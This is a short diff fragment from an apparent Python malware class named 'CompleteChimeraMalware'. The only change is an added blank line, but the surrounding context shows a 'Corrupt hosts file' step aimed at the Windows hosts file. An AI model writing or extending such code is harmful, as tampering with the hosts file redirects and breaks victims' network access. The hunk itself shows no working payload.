@@ -215,6 +215,7 @@ class CompleteChimeraMalware:
         corruption_actions = 0
         
         # 1. Corrupt hosts file
+        
         try:
             hosts_path = r"C:\Windows\System32\drivers\etc\hosts"
             if os.path.exists(hosts_path):
